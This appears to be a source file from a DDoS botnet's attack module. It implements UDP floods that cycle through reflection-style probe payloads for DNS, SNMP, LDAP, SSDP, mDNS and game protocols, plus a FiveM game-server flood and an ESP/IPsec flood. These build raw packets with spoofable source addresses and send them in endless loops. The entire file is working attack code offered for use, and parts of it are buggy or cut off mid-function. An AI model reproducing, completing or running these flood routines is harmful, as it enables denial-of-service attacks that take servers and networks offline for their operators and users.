#define _GNU_SOURCE

#include <stdint.h>
#include <arpa/inet.h>
#include <signal.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <netinet/if_ether.h>
#include <string.h>
#include <fcntl.h>

#include "command.h"
#include "main.h"
#include "rand.h"
#include "checksum.h"
#include "resolve.h"
#include "scan.h"

unsigned short csum (unsigned short *buf, int count)
{
        register unsigned long sum = 0;
        while( count > 1 ) { sum += *buf++; count -= 2; }
        if(count > 0) { sum += *(unsigned char *)buf; }
        while (sum>>16) { sum = (sum & 0xffff) + (sum >> 16); }
        return (unsigned short)(~sum);
}

unsigned short vse_bypass_checksum(unsigned short *ptr, int nbytes)
{
    register long sum;
    unsigned short oddbyte;
    register short answer;

    sum = 0;
    while (nbytes > 1)
    {
        sum += *ptr++;
        nbytes -= 2;
    }
    if (nbytes == 1)
    {
        oddbyte = 0;
        *((u_char *)&oddbyte) = *(u_char *)ptr;
        sum += oddbyte;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum = sum + (sum >> 16);
    answer = (short)~sum;

    return (answer);
}

unsigned short tcp_pseudo_sum(struct iphdr *iph, struct tcphdr *tcph, int pipisize) {
        struct tcp_pseudo
        {
        unsigned long src_addr;
        unsigned long dst_addr;
        unsigned char zero;
        unsigned char proto;
        unsigned short length;
        } pseudohead;
        unsigned short total_len = iph->tot_len;
        pseudohead.src_addr=iph->saddr;
        pseudohead.dst_addr=iph->daddr;
        pseudohead.zero=0;
        pseudohead.proto=IPPROTO_TCP;
        pseudohead.length=htons(sizeof(struct tcphdr) + pipisize);
        int totaltcp_len = sizeof(struct tcp_pseudo) + sizeof(struct tcphdr) + pipisize;
        unsigned short *tcp = malloc(totaltcp_len);
        memcpy((unsigned char *)tcp,&pseudohead,sizeof(struct tcp_pseudo));
        memcpy((unsigned char *)tcp+sizeof(struct tcp_pseudo),(unsigned char *)tcph,sizeof(struct tcphdr) + pipisize);
        unsigned short output = csum(tcp,totaltcp_len);
        free(tcp);
        return output;
}

unsigned short udp_pseudo_sum(struct iphdr *iph, struct udphdr *udph, int pipisize) {
        struct udp_pseudo
        {
        unsigned long src_addr;
        unsigned long dst_addr;
        unsigned char zero;
        unsigned char proto;
        unsigned short length;
        } pseudohead;
        unsigned short total_len = iph->tot_len;
        pseudohead.src_addr=iph->saddr;
        pseudohead.dst_addr=iph->daddr;
        pseudohead.zero=0;
        pseudohead.proto=IPPROTO_UDP;
        pseudohead.length=htons(sizeof(struct udphdr) + pipisize);
        int totaludp_len = sizeof(struct udp_pseudo) + sizeof(struct udphdr) + pipisize;
        unsigned short *udp = malloc(totaludp_len);
        memcpy((unsigned char *)udp,&pseudohead,sizeof(struct udp_pseudo));
        memcpy((unsigned char *)udp+sizeof(struct udp_pseudo),(unsigned char *)udph,sizeof(struct udphdr) + pipisize);
        unsigned short output = csum(udp,totaludp_len);
        free(udp);
        return output;
}

struct tcp_pseudo_header    //needed for checksum calculation
{
    unsigned int source_address;
    unsigned int dest_address;
    unsigned char placeholder;
    unsigned char protocol;
    unsigned short tcp_length;
     
    struct tcphdr tcp;
};

uint32_t rand_next(void)
{
    uint32_t t = x;
    t ^= t << 11;
    t ^= t >> 8;
    x = y; y = z; z = w;
    w ^= w >> 19;
    w ^= t;
    return w;
} //OVHTCPSYN

struct udp_pseudo_header
{
    u_int32_t source_address;
    u_int32_t dest_address;
    u_int8_t placeholder;
    u_int8_t protocol;
    u_int16_t udp_length;
};

void vse_init_rand(uint32_t x)
{
    int i;

    S[0] = x;
    S[1] = x + PHI;
    S[2] = x + PHI + PHI;

    for (i = 3; i < 4096; i++)
        S[i] = S[i - 3] ^ S[i - 2] ^ PHI ^ i;
}

unsigned long int rand_cmwc(void)
{
        unsigned long long int t, a = 18782LL;
        static unsigned long int i = 4095;
        unsigned long int x, r = 0xfffffffe;
        i = (i + 1) & 4095;
        t = a * Q[i] + c;
        c = (t >> 32);
        x = t + c;
        if (x < c) {
                x++;
                c++;
        }
        return (Q[i] = r - x);
}

int randnum(int min_num, int max_num)
{
    int result = 0, low_num = 0, hi_num = 0;

    if (min_num < max_num)
    {
        low_num = min_num;
        hi_num = max_num + 1;
    } else {
        low_num = max_num + 1;
        hi_num = min_num;
    }

    result = (rand_cmwc() % (hi_num - low_num)) + low_num;
    return result;
}

char random_hex() {
    char hexs[] = {'\x0', '\x01', '\x02', '\x03', '\x04', '\x05', '\x06', '\x07', '\x08', '\x09', '\x0a', '\x0b', '\x0c', '\x0d', '\x0e', '\x0f', '\x10', '\x11', '\x12', '\x13', '\x14', '\x15', '\x16', '\x17', '\x18', '\x19', '\x1a', '\x1b', '\x1c', '\x1d', '\x1e', '\x1f', '\x20', '\x21', '\x22', '\x23', '\x24', '\x25', '\x26', '\x27', '\x28', '\x29', '\x2a', '\x2b', '\x2c', '\x2d', '\x2e', '\x2f', '\x30', '\x31', '\x32', '\x33', '\x34', '\x35', '\x36', '\x37', '\x38', '\x39', '\x3a', '\x3b', '\x3c', '\x3d', '\x3e', '\x3f', '\x40', '\x41', '\x42', '\x43', '\x44', '\x45', '\x46', '\x47', '\x48', '\x49', '\x4a', '\x4b', '\x4c', '\x4d', '\x4e', '\x4f', '\x50', '\x51', '\x52', '\x53', '\x54', '\x55', '\x56', '\x57', '\x58', '\x59', '\x5a', '\x5b', '\x5c', '\x5d', '\x5e', '\x5f', '\x60', '\x61', '\x62', '\x63', '\x64', '\x65', '\x66', '\x67', '\x68', '\x69', '\x6a', '\x6b', '\x6c', '\x6d', '\x6e', '\x6f', '\x70', '\x71', '\x72', '\x73', '\x74', '\x75', '\x76', '\x77', '\x78', '\x79', '\x7a', '\x7b', '\x7c', '\x7d', '\x7e', '\x7f', '\x80', '\x81', '\x82', '\x83', '\x84', '\x85', '\x86', '\x87', '\x88', '\x89', '\x8a', '\x8b', '\x8c', '\x8d', '\x8e', '\x8f', '\x90', '\x91', '\x92', '\x93', '\x94', '\x95', '\x96', '\x97', '\x98', '\x99', '\x9a', '\x9b', '\x9c', '\x9d', '\x9e', '\x9f', '\xa0', '\xa1', '\xa2', '\xa3', '\xa4', '\xa5', '\xa6', '\xa7', '\xa8', '\xa9', '\xaa', '\xab', '\xac', '\xad', '\xae', '\xaf', '\xb0', '\xb1', '\xb2', '\xb3', '\xb4', '\xb5', '\xb6', '\xb7', '\xb8', '\xb9', '\xba', '\xbb', '\xbc', '\xbd', '\xbe', '\xbf', '\xc0', '\xc1', '\xc2', '\xc3', '\xc4', '\xc5', '\xc6', '\xc7', '\xc8', '\xc9', '\xca', '\xcb', '\xcc', '\xcd', '\xce', '\xcf', '\xd0', '\xd1', '\xd2', '\xd3', '\xd4', '\xd5', '\xd6', '\xd7', '\xd8', '\xd9', '\xda', '\xdb', '\xdc', '\xdd', '\xde', '\xdf', '\xe0', '\xe1', '\xe2', '\xe3', '\xe4', '\xe5', '\xe6', '\xe7', '\xe8', '\xe9', '\xea', '\xeb', '\xec', '\xed', '\xee', '\xef', '\xf0', '\xf1', '\xf2', '\xf3', '\xf4', '\xf5', '\xf6', '\xf7', '\xf8', '\xf9', '\xfa', '\xfb', '\xfc', '\xfd', '\xfe', '\xff'};
    int length = sizeof(hexs) / sizeof(hexs[0]);
    return rand() % (length + 1);
}

void flood_udp_hex(struct arguments *args)
{
    DEBUG_PRINT("HEX-UDP FLOODING!\n");

    char* strings[] = {
            "\x0D\x0A\x0D\x0A",
            random_hex() + random_hex() + "\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03\x77\x77\x77\x06\x67\x6f\x6f\x67\x6c\x65\x03\x63\x6f\x6d\x00\x00\x01\x00\x01",
            random_hex() + random_hex() + "\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03\x77\x77\x77\x06\x67\x6f\x6f\x67\x6c\x65\x03\x63\x6f\x6d\x00\x00\x05\x00\x01",
            random_hex() + random_hex() + "\x72\xFE\x1D\x13\x00\x00\x00\x00\x00\x00\x00\x02\x00\x01\x86\xA0\x00\x01\x97\x7C\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",
            "\xd9\x00\x0a\xfa\x00\x00\x00\x00\x00\x01\x02\x90\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc5\x02\x04\xec\xec\x42\xee\x92",
            "\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03\x77\x77\x77\x06\x67\x6f\x6f\x67\x6c\x65\x03\x63\x6f\x6d\x00\x00\x05\x00\x01",
            random_hex() + random_hex() + random_hex() + random_hex() + random_hex() + random_hex() + random_hex() + random_hex() + random_hex() + random_hex() + random_hex() + random_hex() + random_hex() + random_hex() + "",
            "\x30\x3A\x02\x01\x03\x30\x0F\x02\x02\x4A\x69\x02\x03\x00\xFF\xE3\x04\x01\x04\x02\x01\x03\x04\x10\x30\x0E\x04\x00\x02\x01\x00\x02\x01\x00\x04\x00\x04\x00\x04\x00\x30\x12\x04\x00\x04\x00\xA0\x0C\x02\x02\x37\xF0\x02\x01\x00\x02\x01\x00\x30\x00",
            "\x00\x01\x00\x02\x00\x01\x00",
            "\x30\x84\x00\x00\x00\x2d\x02\x01\x07\x63\x84\x00\x00\x00\x24\x04\x00\x0a\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01\x64\x01\x01\x00\x87\x0b\x6f\x62\x6a\x65\x63\x74\x43\x6c\x61\x73\x73\x30\x84\x00\x00\x00\x00",
            "\x02\x01\x00\x006 \x00\x00\x00\x00\x00\x01\x00\x02en\x00\x00\x00\x15service:service-agent\x00\x07 default\x00\x00\x00\x00",
            "\x00\x11\x22\x33\x44\x55\x66\x77\x00\x00\x00\x00\x00\x00\x00\x00\x01\x10\x02\x00\x00\x00\x00\x00\x00\x00\x00\xC0\x00\x00\x00\xA4\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x98\x01\x01\x00\x04\x03\x00\x00\x24\x01\x01\x00\x00\x80\x01\x00\x05\x80\x02\x00\x02\x80\x03\x00\x01\x80\x04\x00\x02\x80\x0B\x00\x01\x00\x0C\x00\x04\x00\x00\x00\x01\x03\x00\x00\x24\x02\x01\x00\x00\x80\x01\x00\x05\x80\x02\x00\x01\x80\x03\x00\x01\x80\x04\x00\x02\x80\x0B\x00\x01\x00\x0C\x00\x04\x00\x00\x00\x01\x03\x00\x00\x24\x03\x01\x00\x00\x80\x01\x00\x01\x80\x02\x00\x02\x80\x03\x00\x01\x80\x04\x00\x02\x80\x0B\x00\x01\x00\x0C\x00\x04\x00\x00\x00\x01",
            "\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10",
            "\x06\x00\xff\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x09\x20\x18\xc8\x81\x00\x38\x8e\x04\xb5",
            "SNQUERY: 127.0.0.1:AAAAAA:xsvr",
            "8d\xc1x\x01\xb8\x9b\xcb\x8f\0\0\0\0\0",
            "\x02",
            "\x1e\x00\x01\x30\x02\xfd\xa8\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",
            "\x4d\x2d\x53\x45\x41\x52\x43\x48\x20\x2a\x20\x48\x54\x54\x50\x2f\x31\x2e\x31\x0d\x0a\x48\x4f\x53\x54\x3a\x20\x32\x35\x35\x2e\x32\x35\x35\x2e\x32\x35\x35\x2e\x32\x35\x35\x3a\x31\x39\x30\x30\x0d\x0a\x4d\x41\x4e\x3a\x20\x22\x73\x73\x64\x70\x3a\x64\x69\x73\x63\x6f\x76\x65\x72\x22\x0d\x0a\x4d\x58\x3a\x20\x31\x0d\x0a\x53\x54\x3a\x20\x75\x72\x6e\x3a\x64\x69\x61\x6c\x2d\x6d\x75\x6c\x74\x69\x73\x63\x72\x65\x65\x6e\x2d\x6f\x72\x67\x3a\x73\x65\x72\x76\x69\x63\x65\x3a\x64\x69\x61\x6c\x3a\x31\x0d\x0a\x55\x53\x45\x52\x2d\x41\x47\x45\x4e\x54\x3a\x20\x47\x6f\x6f\x67\x6c\x65\x20\x43\x68\x72\x6f\x6d\x65\x2f\x36\x30\x2e\x30\x2e\x33\x31\x31\x32\x2e\x39\x30\x20\x57\x69\x6e\x64\x6f\x77\x73\x0d\x0a\x0d\x0a",
            "\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x09_services\x07_dns-sd\x04_udp\x05local\x00\x00\x0C\x00\x01",
            "xf4\xbe\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x002x\xba\x85\tTeamSpeak\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\nWindows XP\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00 \x00<\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08nickname\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",
            "\x05\xca\x7f\x16\x9c\x11\xf9\x89\x00\x00\x00\x00\x02\x9d\x74\x8b\x45\xaa\x7b\xef\xb9\x9e\xfe\xad\x08\x19\xba\xcf\x41\xe0\x16\xa2\x32\x6c\xf3\xcf\xf4\x8e\x3c\x44\x83\xc8\x8d\x51\x45\x6f\x90\x95\x23\x3e\x00\x97\x2b\x1c\x71\xb2\x4e\xc0\x61\xf1\xd7\x6f\xc5\x7e\xf6\x48\x52\xbf\x82\x6a\xa2\x3b\x65\xaa\x18\x7a\x17\x38\xc3\x81\x27\xc3\x47\xfc\xa7\x35\xba\xfc\x0f\x9d\x9d\x72\x24\x9d\xfc\x02\x17\x6d\x6b\xb1\x2d\x72\xc6\xe3\x17\x1c\x95\xd9\x69\x99\x57\xce\xdd\xdf\x05\xdc\x03\x94\x56\x04\x3a\x14\xe5\xad\x9a\x2b\x14\x30\x3a\x23\xa3\x25\xad\xe8\xe6\x39\x8a\x85\x2a\xc6\xdf\xe5\x5d\x2d\xa0\x2f\x5d\x9c\xd7\x2b\x24\xfb\xb0\x9c\xc2\xba\x89\xb4\x1b\x17\xa2\xb6",
    };

    int i = 0;
    char **data;
    int *fds;
    
    uint16_t size = retrieve_opt_num(args->options, args->num_of_flags, OPT_SIZE, 592);
    uint16_t dport = retrieve_opt_num(args->options, args->num_of_flags, OPT_PORT, 0xffff);
    uint16_t sport = retrieve_opt_num(args->options, args->num_of_flags, OPT_SOURCE_PORT, 0xffff);
    uint16_t maxpps = retrieve_opt_num(args->options, args->num_of_flags, OPT_MAXPPS, 0);
    uint16_t minpps = retrieve_opt_num(args->options, args->num_of_flags, OPT_MINPPS, 0);
    uint16_t maxlen = retrieve_opt_num(args->options, args->num_of_flags, OPT_MAXLEN, 0);
    uint16_t minlen = retrieve_opt_num(args->options, args->num_of_flags, OPT_MINLEN, 0);
    uint16_t pps = retrieve_opt_num(args->options, args->num_of_flags, OPT_PPS, 0);
    uint16_t payload = retrieve_opt_num(args->options, args->num_of_flags, OPT_PAYLOAD, 0xffff);
    uint16_t rand = retrieve_opt_num(args->options, args->num_of_flags, OPT_RAND, 0);
    uint16_t no_bind = retrieve_opt_num(args->options, args->num_of_flags, OPT_BIND, 0);
    uint16_t threads = retrieve_opt_num(args->options, args->num_of_flags, OPT_THREAD_COUNT, 0);
    //
    if (dport <= 0 || dport > 65535)
        dport = 10000 + rand_next() % (65535 - 10000);

    if (sport <= 0 || sport > 65535)
        sport = 10000 + rand_next() % (65535 - 10000);

    if ((minpps > 0 && minpps <= (ATTACKS_MAXPPS - 1)) && (maxpps > minpps && maxpps <= ATTACKS_MAXPPS)) // PPS Calcul result
        pps = minpps + rand_next() % (maxpps - minpps);

    if ((minlen > 0 && minlen <= (ATTACKS_MAXLEN - 1)) && (maxlen > minlen && maxlen <= ATTACKS_MAXLEN)) //MAXLEN & MINLEN + Size calcul result
            size = minlen + rand_next() % (maxlen - minlen);
        else //if nothing are set, size = size you have set
        {
            if (size <= 0 || size >= ATTACKS_MAXLEN)
                size = 1024;
        }
        //--//
        DEBUG_PRINT("Total flags: %d\n", args->num_of_flags);
        DEBUG_PRINT("Targets: %d\n", args->num_of_targets);
        DEBUG_PRINT("Packet Lenght: %d\n", size);
        DEBUG_PRINT("Port: %d\n", dport);
        DEBUG_PRINT("Source Port: %d\n", sport);
        DEBUG_PRINT("Binded: %d\n", no_bind);
        DEBUG_PRINT("PPS: %d\n", pps);
        DEBUG_PRINT("Thread's: %d\n", threads);
        DEBUG_PRINT("Rand?: %d\n", rand);

    for(i = 0; i < args->num_of_targets; i++)
    {
        DEBUG_PRINT("Target: %d.%d.%d.%d/%d\n", args->targets[i].host & 0xff, (args->targets[i].host >> 8) & 0xff, (args->targets[i].host >> 16) & 0xff, (args->targets[i].host >> 24) & 0xff, args->targets[i].netmask);
    }

    data = (char **)calloc(args->num_of_targets, sizeof(char *));
    if(!data)
    {
        exit(1);
    }

    fds = (int *)calloc(args->num_of_targets, sizeof(int));
    if(!fds)
    {
        exit(1);
    }

    for(i = 0; i < args->num_of_targets; i++)
    {
        struct sockaddr_in bind_addr;
        struct sockaddr_in addr;

        fds[i] = socket(AF_INET, SOCK_DGRAM, 0);
        if(fds[i] == -1)
        {
            exit(1);
        }

        data[i] = (char *)malloc(size + 1);
        if(!data[i])
        {
            exit(1);
        }

        bind_addr.sin_family = AF_INET;
        bind_addr.sin_port = htons(sport);
        bind_addr.sin_addr.s_addr = 0;

        bind(fds[i], (struct sockaddr *)&bind_addr, sizeof(bind_addr));

        addr.sin_family = AF_INET;
        addr.sin_port = htons(dport);
        addr.sin_addr.s_addr = args->targets[i].netmask < 32 ? (htonl(ntohl(args->targets[i].host) + (((uint32_t)rand_new()) >> args->targets[i].netmask))) : args->targets[i].host;

        connect(fds[i], (struct sockaddr *)&addr, sizeof(addr));

    }

if(pps != 0)
{
   while(TRUE)
    {
        for(i = 0; i < args->num_of_targets; i++)
        {
            int p = 0;
            for(p = 0; p < pps; p++)
            {
                    if(rand == 1)
                        rand_string(data[i], size);

                    send(fds[i], strings[i] + size, strlen(strings[i]) + size, MSG_NOSIGNAL);
                }
            }
        }
    }
   else 
   {
      while(TRUE)
        {
            for(i = 0; i < args->num_of_targets; i++)
            {
                if(rand == 1)
                        rand_string(data[i], size);

                    send(fds[i], strings[i] + size, strlen(strings[i]) + size, MSG_NOSIGNAL);
            }
        }
    }
}

void flood_udp_fivem(struct arguments *args)
{
    DEBUG_PRINT("FIVEM V2 PAYLOAD MIXED!\n");

    int x = 0;
    int i = 0;
    int *fds;
    char datagram[MAX_PACKET_SIZE], *data, *pseudogram;
    uint8_t tos = retrieve_opt_num(args->options, args->num_of_flags, OPT_TOS, 0xffff);
    uint16_t id = retrieve_opt_num(args->options, args->num_of_flags, OPT_ID, 0xffff);
    uint16_t size = retrieve_opt_num(args->options, args->num_of_flags, OPT_SIZE, 150);
    uint16_t dport = retrieve_opt_num(args->options, args->num_of_flags, OPT_PORT, 0xffff);
    uint8_t ttl = retrieve_opt_num(args->options, args->num_of_flags, OPT_TTL, 0xff);
    uint16_t sport = retrieve_opt_num(args->options, args->num_of_flags, OPT_SOURCE_PORT, 0xffff);
    uint32_t source_ip = retrieve_opt_ipv4(args->options, args->num_of_flags, OPT_SOURCE_IP, LOCAL_ADDRESS);

    fds = (int *)calloc(args->num_of_targets, sizeof(int));
    if(!fds)
    {
        exit(1);
    }

    for(x = 0; x < args->num_of_targets; x++)
    {

        fds[x] = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);
        if(fds[x] == -1)
        {
            DEBUG_PRINT("Failed to create the UDP socket for the flood!\n");
            exit(1);
        }

        i = 1;
        if(setsockopt(fds[x], IPPROTO_IP, IP_HDRINCL, &i, sizeof(i)) == -1)
        {
            DEBUG_PRINT("Failed to set IP_HDRINCL for the UDP flood\n");
            exit(1);
        }

        //Start All
        memset(datagram, 0, MAX_PACKET_SIZE);
        struct iphdr *ip_header = (struct iphdr *)datagram;
        struct udphdr *udp_header = (struct udphdr *)(datagram + sizeof(struct ip));
        struct udp_pseudo_header psh;
        data = datagram + sizeof(struct iphdr) + sizeof(struct udphdr) + size;

        // IPv4 Header
        ip_header->version = 4;
        ip_header->tos = tos;
        ip_header->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + strlen(data) + size);
        ip_header->ihl = 5;
        ip_header->frag_off = 0;
        ip_header->ttl = MAXTTL;
        ip_header->id = htons(id);
        ip_header->protocol = IPPROTO_UDP;
        ip_header->saddr = source_ip;
        ip_header->daddr = args->targets[x].host;
        psh.dest_address = ip_header->daddr;
        psh.placeholder = 0;
        psh.protocol = 17;
        udp_header->dest = htons(dport);
        udp_header->source = htons(sport);
        udp_header->check = 0;

    }

    while(TRUE)
    {
        for(x = 0; x < args->num_of_targets; x++)
        {
            struct iphdr *ip_header;
            struct udphdr *udp_header;
            struct udp_pseudo_header psh;
            struct sockaddr_in addr;

            ip_header = (struct iphdr *)datagram;
            udp_header = (struct udphdr *)(ip_header + 1);
            int rtmp = rand_cmwc() % 0x6;
            if (rtmp == 4)
            {
                strcpy(data, "\xff\xff\xff\xff\x67\x65\x74\x69\x6e\x66\x6f\x20\x78\x79\x7a");
            }
            else if (rtmp == 3)
            {
                strcpy(data, "\x80\x00\x29\x5a\x01\xff\x00\x01\x00\x01\x83\xd6\x86\x00\x00\x01\x00\x46\x01\x00\x00\x00\x74\x6f\x6b\x65\x6e\x3d\x62\x31\x35\x33\x31\x36\x64\x63\x2d\x36\x63\x65\x39\x2d\x34\x62\x34\x32\x2d\x39\x31\x62\x35\x2d\x32\x36\x62\x65\x34\x37\x32\x32\x35\x63\x39\x38\x26\x67\x75\x69\x64\x3d\x31\x34\x38\x36\x31\x38\x37\x39\x32\x34\x35\x34\x33\x32\x30\x31\x31\x38");
            }
            else if (rtmp == 2)
            {
                strcpy(data, "\x14\xf4\xd4\x8d\x73\x43\x90\x9c\xec\x33\xad\xd0\x48\x90\xbb\xb1\xa2\x2f\x7e\xda\xc4\xa5\x14\xb6");
            }
            else if (rtmp < 5)
            {
                strcpy(data, "\x86\xb6\x06\x12\xf7\xf3\x17\xb4\xa5\x2a\x8d\xfb\x5e\xce\x92\x6d\xca\x1a\x34\x2a\xd1\xb8\xaf\xf7");
            }
            else
            {
                unsigned char strdata1[2048 + 1];
                strcpy(strdata1, "\x0f\x02\x11\x23\x9f\xdd\x10\x09\x33\xfe\x1f\x8f\xba\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xee\x31\x41\x00\x00\x41\x0f\x02\x11\x23\x9f\xdd\x10\x09\x33\xfe\x1f\x8f\xba\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xee\x31\x41\x00\x00\x41\x0f\x02\x11\x23\x9f\xdd\x10\x09\x33\xfe\x1f\x8f\xba\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xee\x31\x41\x00\x00\x41\x00\x00\x00\x00");
                if (rtmp == 5)
                    strcpy(strdata1, "\x0f\x02\x11\x23\x9f\xdd\x10\x09\x33\xfe\x1f\x8f\xba\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xee\x31\x41\x00\x00\x41\x0f\x02\x11\x23\x9f\xdd\x10\x09\x33\xfe\x1f\x8f\xba\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xee\x31\x41\x00\x00\x41\x0f\x02\x11\x23\x9f\xdd\x10\x09\x33\xfe\x1f\x8f\xba\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xee\x31\x41\x00\x00\x41\x00\x00\x00\x00");
                else
                    strcpy(strdata1, "\x55");
                while (strlen(strdata1) < 9)
                    sprintf(strdata1, "%s%c", strdata1, rand_cmwc() & 0x7F);
                strcpy(data, strdata1);
            }

            if(args->targets[x].netmask < 32)
                ip_header->daddr = htonl(ntohl(ip_header->daddr) + (((uint32_t)rand_new()) >> args->targets[x].netmask));

            // Specified a random source address
            if(ip_header->saddr == 0xffffffff)
                ip_header->saddr = rand_new() & 0xffffffff;

            if(ip_header->tos == 0xffff)
                ip_header->tos = rand_new() & 0xffffffff;

            if(ip_header->id == 0xffff)
                ip_header->id = htonl(rand_cmwc() & 0xFFFFFFFF);

            if(dport == 0xffff)
                udp_header->dest = htons(randnum(1000,5030));

            if(sport == 0xffff)
                udp_header->source = htons(randnum(1000,50200));


            ip_header->saddr = source_ip;
            ip_header->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + strlen(data);
            ip_header->id = rand_cmwc() & 0x5;
            ip_header->check = vse_bypass_checksum((unsigned short *)datagram, ip_header->tot_len);
            ip_header->ttl = (rand_cmwc() & 0x3 > 1 ? 128 + (rand_cmwc() & 0x4) : 128 - (rand_cmwc() & 0x7));
            udp_header->source = htons(sport);
            udp_header->len = htons(8 + strlen(data));
            udp_header->check = 0;
            psh.source_address = source_ip;
            psh.udp_length = htons(sizeof(struct udphdr) + strlen(data));
            int psize = sizeof(struct udp_pseudo_header) + sizeof(struct udphdr) + strlen(data);
            pseudogram = malloc(psize);
            memcpy(pseudogram, (char *)&psh, sizeof(struct udp_pseudo_header));
            memcpy(pseudogram + sizeof(struct udp_pseudo_header), udp_header, sizeof(struct udphdr) + strlen(data));
            udp_header->check = vse_bypass_checksum((unsigned short *)pseudogram, psize);

            addr.sin_family = AF_INET;
            addr.sin_port = udp_header->dest;
            addr.sin_addr.s_addr = ip_header->daddr; //DestIP
            //Start the flood
            sendto(fds[x], datagram, sizeof(struct iphdr) + sizeof(struct udphdr) + strlen(data) + psize, MSG_NOSIGNAL, (struct sockaddr *)&addr, sizeof(addr));

        }
    }
}

void flood_udp_esp(struct arguments *args)
{
    DEBUG_PRINT("ESP/IPSEC FLOODING!\n");

    int x = 0;
    int i = 0;
    char **data;
    int *fds;

    uint8_t tos = retrieve_opt_num(args->options, args->num_of_flags, OPT_TOS, 0xffff);
    uint16_t id = retrieve_opt_num(args->options, args->num_of_flags, OPT_ID, 0xffff);
    uint16_t size = retrieve_opt_num(args->options, args->num_of_flags, OPT_SIZE, 1);
    uint16_t dport = retrieve_opt_num(args->options, args->num_of_flags, OPT_PORT, 0xffff);
    uint8_t ttl = retrieve_opt_num(args->options, args->num_of_flags, OPT_TTL, 0xff);
    uint16_t sport = retrieve_opt_num(args->options, args->num_of_flags, OPT_SOURCE_PORT, 0xffff);
    uint32_t source_ip = retrieve_opt_ipv4(args->options, args->num_of_flags, OPT_SOURCE_IP, LOCAL_ADDRESS);

    data = (char **)calloc(args->num_of_targets, sizeof(char *));
    if(!data)
    {
        DEBUG_PRINT("Failed to allocate data to initialize the RAW-UDP flood\n");
        exit(1);
    }

    fds = (int *)calloc(args->num_of_targets, sizeof(int));
    if(!fds)
    {
        exit(1);
    }

    for(x = 0; x < args->num_of_targets; x++)
    {
        struct iphdr *ip_header;
        struct udphdr *udp_header;
        char *a;

        fds[x] = socket(PF_INET, SOCK_RAW, IPPROTO_RAW);
        if(fds[x] == -1)
        {
            DEBUG_PRINT("Failed to create the RAW socket for the flood!\n");
            free(data);
            exit(1);
        }

        i = 1;
        if(setsockopt(fds[x], IPPROTO_IP, IP_HDRINCL, &i, sizeof(i)) == -1)
        {
            DEBUG_PRINT("Failed to set IP_HDRINCL for the RAW flood\n");
            free(data);
            exit(1);
        }

        data[x] = (char *)malloc(size + 110);
        if(!data[x])
        {
            DEBUG_PRINT("Failed to allocate memory for the RAW flood\n");
            free(data);
            exit(1);
        }

        ip_header = (struct iphdr *)data[x];
        udp_header = (struct udphdr *)(ip_header + 1);

        // IPv4 Header
        ip_header->version = 4;
        ip_header->tos = tos;
        ip_header->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + size);
        ip_header->ihl = 5;
        ip_header->frag_off = 0;
        ip_header->ttl = ttl;
        ip_header->id = htons(id);
        ip_header->protocol = 50;
        ip_header->saddr = source_ip;
        ip_header->daddr = args->targets[x].host;

        udp_header->dest = dport;
        udp_header->source = sport;
        udp_header->len = htons(sizeof(struct udphdr) + size);

    }

    while(TRUE)
    {
        for(x = 0; x < args->num_of_targets; x++)
        {
            struct iphdr *ip_header;
            struct udphdr *udp_header;
            struct sockaddr_in addr;

            ip_header = (struct iphdr *)data[x];
            udp_header = (struct udphdr *)(ip_header + 1);

            if(args->targets[x].netmask < 32)
                ip_header->daddr = htonl(ntohl(ip_header->daddr) + (((uint32_t)rand_new()) >> args->targets[x].netmask));

            // Specified a random source address
            if(ip_header->saddr == 0xffffffff)
                ip_header->saddr = rand_new() & 0xffffffff;

            if(ip_header->id == 0xffff)
                ip_header->id = htonl(rand_cmwc() & 0xFFFFFFFF);

            if(ip_header->id == 0xffff)
                ip_header->id = htonl(rand_cmwc() & 0xFFFFFFFF);

            if(dport == 0xffff)
                udp_header->dest = htons(randnum(1000,50000));

            if(sport == 0xffff)
                udp_header->source = htons(randnum(1000,50000));

            // IP header checksum
            ip_header->check = 0;
            ip_header->check = ip_header_checksum((uint16_t *)ip_header, sizeof(struct iphdr));

